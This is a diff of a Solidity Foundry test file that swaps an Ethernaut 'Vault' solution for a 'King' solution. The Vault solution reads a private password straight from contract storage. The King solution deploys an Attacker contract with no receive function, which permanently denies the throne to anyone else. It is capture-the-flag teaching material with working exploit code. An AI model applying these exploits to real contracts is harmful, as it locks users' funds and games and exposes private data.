@@ -3,17 +3,15 @@ pragma solidity >=0.6.0;
 pragma experimental ABIEncoderV2;
 
 import "./utils/BaseTest.sol";
-import "src/levels/Vault.sol";
-import "src/levels/VaultFactory.sol";
+import "src/levels/King.sol";
+import "src/levels/KingFactory.sol";
 
-contract TestVault is BaseTest {
-    Vault private level;
-
-    using stdStorage for StdStorage;
+contract TestKing is BaseTest {
+    King private level;
 
     constructor() public {
         // SETUP LEVEL FACTORY
-        levelFactory = new VaultFactory();
+        levelFactory = new KingFactory();
     }
 
     function setUp() public override {
@@ -28,11 +26,11 @@ contract TestVault is BaseTest {
     function setupLevel() internal override {
         /** CODE YOUR SETUP HERE */
 
-        levelAddress = payable(this.createLevelInstance(true));
-        level = Vault(levelAddress);
+        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
+        level = King(levelAddress);
 
         // Check that the contract is correctly setup
-        assertEq(level.locked(), true);
+        assertEq(level._king(), address(levelFactory));
     }
 
     function exploitLevel() internal override {
@@ -40,24 +38,23 @@ contract TestVault is BaseTest {
 
         vm.startPrank(player);
 
-        /// contract LeetContract {
-        ///     uint256 private leet = 1337; // slot 0
-        /// }
+        // King contract is sending ether to the old king using "transfer" method
+        // If the old king is a smart contract and if it doesn't have a fallback or a receive fn
+        // then the txn to be new king would revert, preventing anyone from becoming the new king
 
-        // We can unlock the contract if we know the password that was used to lock it
-        // Password is stored in the smart contract but it's visibility is private
-        // but nothing is really private in the blockchain, private visibility can only prevent
-        // other smart contracts to access it.
+        // The current king is a smart contract without the ability to receive ether which means
+        // that the king contract became the victim of DOS attack
+        Attacker attacker = new Attacker{value: 1 ether}(address(level));
 
-        // We can read a variable of the smart contract off-chain
-        // directly from the storage slot even if it's visibility is set to private.
-
-        // Reading first index of the storage slot because password is stored in the second slot
-        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
-        level.unlock(password);
-
-        assertEq(level.locked(), false);
+        assertEq(level._king(), address(attacker));
 
         vm.stopPrank();
+    }
+}
+
+contract Attacker {
+    constructor(address _level) public payable {
+        (bool success, ) = _level.call{value: msg.value}("");
+        require(success, "Transaction failed");
     }
 }
